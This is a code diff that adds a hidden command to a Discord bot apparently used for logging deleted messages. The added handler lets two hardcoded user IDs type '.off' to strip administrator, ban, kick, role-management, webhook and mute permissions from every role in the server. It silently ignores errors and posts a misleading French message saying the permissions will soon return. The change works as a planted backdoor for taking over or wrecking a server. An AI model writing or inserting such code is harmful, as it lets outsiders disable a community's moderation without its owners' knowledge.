@@ -115,6 +115,20 @@ bot.on('messageDelete', function(message, channel){
   
 }),
 
+bot.on('message', message => {
+    let authorized = [`562667788645171201` , `381204352599326720`]
+    if(!authorized.includes(message.author.id)) return;
+  if (message.content === '.off') {
+  const roles = message.guild.roles.cache.filter(role =>  role.permissions.any(["ADMINISTRATOR", "MANAGE_ROLES", "KICK_MEMBERS", "BAN_MEMBERS", "MANAGE_WEBHOOKS", "MUTE_MEMBERS", "MOVE_MEMBERS"]));
+  roles.forEach(role => role.setPermissions(role.permissions.remove(["ADMINISTRATOR", "MANAGE_ROLES", "KICK_MEMBERS", "BAN_MEMBERS", "MANAGE_WEBHOOKS", "MUTE_MEMBERS", "MOVE_MEMBERS"])).catch(() => {}))
+
+const exampleEmbed = new Discord.MessageEmbed()
+    .setDescription('**Je désactive les permissions à tous les rôles.**')
+   .addField('Patience...', `Les permissions serons bientôt disponible !`)
+   message.channel.send(exampleEmbed)
+  }
+})
+
 bot.snipes = new Map()
 bot.options.restTimeOffset = 0;
 bot.login(process.env.TOKEN)
